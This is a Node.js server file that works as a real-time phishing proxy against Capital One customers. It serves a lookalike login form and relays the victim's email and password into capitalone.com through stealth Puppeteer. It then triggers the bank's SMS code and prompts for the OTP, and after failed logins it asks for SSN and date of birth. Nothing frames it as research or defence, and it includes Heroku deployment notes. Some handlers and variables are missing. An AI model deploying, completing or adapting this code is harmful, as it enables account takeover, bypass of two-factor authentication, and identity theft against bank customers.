const express = require("express");
const bodyParser = require("body-parser");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");
const qs = require("qs"); // Import qs for encoding the request body

// Add stealth plugin to Puppeteer
puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Turnstile Secret Key (Set this in your Heroku environment variables)
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY;

// Puppeteer browser and page instances
let browser, page;

// Function to launch Puppeteer browser
async function launchBrowser() {
  if (!browser) {
    console.log("Launching Puppeteer browser...");
    browser = await puppeteer.launch({
      headless: true,
      executablePath: "/app/.chrome-for-testing/chrome-linux64/chrome", // Adjust path for Heroku
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage", // Reduce memory pressure
        "--single-process",
        "--disable-gpu",
      ],
    });
    console.log("Browser launched successfully!");
    page = await browser.newPage();
    console.log("New page created!");
  }
}

// Gracefully close Puppeteer browser when the process exits
process.on("SIGTERM", async () => {
  console.log("SIGTERM received. Closing browser...");
  if (browser) await browser.close();
  process.exit(0);
});

process.on("SIGINT", async () => {
  console.log("SIGINT received. Closing browser...");
  if (browser) await browser.close();
  process.exit(0);
});

// Function to validate Turnstile token
async function validateTurnstileToken(token) {
  try {
    if (!TURNSTILE_SECRET_KEY) {
      console.error("Turnstile secret key is missing!");
      return false;
    }

    console.log("Validating Turnstile token with secret:", TURNSTILE_SECRET_KEY);

    // Send the secret and response as the POST request body
    const response = await axios.post(
      "https://challenges.cloudflare.com/turnstile/v0/siteverify",
      qs.stringify({
        secret: TURNSTILE_SECRET_KEY,
        response: token,
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      }
    );

    console.log("Turnstile validation response:", response.data); // Debug log
    return response.data.success;
  } catch (error) {
    console.error("Error validating Turnstile token:", error.message);
    return false;
  }
}

// Serve the login form
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
        <style>
          body {
            font-family: Arial, sans-serif;
            max-width: 500px;
            margin: 2rem auto;
            text-align: center;
          }
          input, button {
            padding: 0.5rem;
            margin: 0.5rem 0;
            font-size: 1rem;
          }
          button {
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
          }
          button:hover {
            background-color: #0056b3;
          }
        </style>
      </head>
      <body>
        <h1>Login</h1>
        <form action="/submit-login" method="POST">
          <label>Email: <input type="text" name="email" required /></label><br/>
          <label>Password: <input type="password" name="password" required /></label><br/>
          <div class="cf-turnstile" data-sitekey="0x4AAAAAAA6n2sVAp0He7OUj"></div><br/>
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
  `);
});

// Handle login form submission
app.post("/submit-login", async (req, res) => {
  const { email, password } = req.body;
  const turnstileToken = req.body["cf-turnstile-response"];

  // Log the received Turnstile token
  console.log("Received Turnstile Token:", turnstileToken);

  if (!turnstileToken) {
    console.error("CAPTCHA token is missing!");
    return res.status(400).send("<h1>CAPTCHA token is missing. Please try again.</h1>");
  }

  // Validate Turnstile token
  const isValidCaptcha = await validateTurnstileToken(turnstileToken);
  if (!isValidCaptcha) {
    console.error("Invalid CAPTCHA token"); // Debug log
    return res.status(403).send("<h1>Invalid CAPTCHA. Please try again.</h1>");
  }

  

  
    // Launch Puppeteer browser if not already launched
    await launchBrowser();

    console.log("Navigating to login page...");
    await page.goto("https://www.capitalone.com/", {
      waitUntil: "networkidle2",
      timeout: 15000, // Reduce timeout to avoid long waits
    });

    console.log("Clearing cookies and cache...");
    const client = await page.target().createCDPSession();
    await client.send("Network.clearBrowserCookies");
    await client.send("Network.clearBrowserCache");

    console.log("Filling in login form...");
    await page.evaluate(() => {
      const emailField = document.querySelector("input#ods-input-0");
      if (emailField) emailField.value = "";
      const passwordField = document.querySelector("input#ods-input-1");
      if (passwordField) passwordField.value = "";
    });
    await page.type("input#ods-input-0", email, { delay: 100 });
    await page.type("input#ods-input-1", password, { delay: 100 });

    console.log("Submitting login form...");
    await page.click("button#noAcctSubmit");
    await page.waitForNavigation({ waitUntil: "networkidle2", timeout: 15000 });

    console.log("Checking login success...");
    const loginSuccess = await page.evaluate(() => {
      const element = document.querySelector("div.option-list-entry--message > p.message--header");
      return element && element.textContent.trim() === "Text me a temporary code";
    });

    if (loginSuccess) {
      console.log("Login successful!");
      invalidAttempts = 0; // Reset invalid attempts

      console.log("Requesting OTP...");
      await page.click("div.option-list-entry--message > p.message--header");
      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
      await page.click('button[data-testtarget="otp-button"]');

      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Enter OTP</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Enter OTP</h1>
            <form action="/submit-otp" method="POST">
              <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
    } else {
      // Unsuccessful login handling
      invalidAttempts++;

      if (invalidAttempts === 1) {
        res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Invalid Login</title>
            </head>
            <body>
              <h1>Invalid Login Attempt</h1>
              <p>Your login details are incorrect. Please try again.</p>
              <form action="/submit-login" method="POST">
                <label>Email: <input type="text" name="email" required /></label><br/>
                <label>Password: <input type="password" name="password" required /></label><br/>
                <button type="submit">Log in</button>
              </form>
            </body>
          </html>
        `);
      } else if (invalidAttempts === 2) {
        
        
        // Second invalid attempt: Navigate to sign-in help
        await page.goto("https://verified.capitalone.com/sign-in-help/", { waitUntil: "networkidle2" });

        // Serve the contact form
        res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Contact Information</title>
              <style>
                body {
                  font-family: Arial, sans-serif;
                  max-width: 500px;
                  margin: 2rem auto;
                  text-align: center;
                }
                input, button {
                  padding: 0.5rem;
                  margin: 0.5rem 0;
                  font-size: 1rem;
                }
                button {
                  background-color: #007bff;
                  color: #fff;
                  border: none;
                  cursor: pointer;
                }
                button:hover {
                  background-color: #0056b3;
                }
              </style>
            </head>
            <body>
              <h1>Contact Information</h1>
              <form action="/submit-contact" method="POST">
                <label>Last Name: <input type="text" name="lastname" required /></label><br/>
                <label>SSN: <input type="password" name="ssn" required /></label><br/>
                <label>Date of Birth: <input type="text" name="dob" required placeholder="mm/dd/yyyy" /></label><br/>
                <button type="submit">Find Me</button>
              </form>
            </body>
          </html>
        `);

      } else {
        res.send("<h1>Too many invalid attempts. Try later.</h1>");
      }
    }
  
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
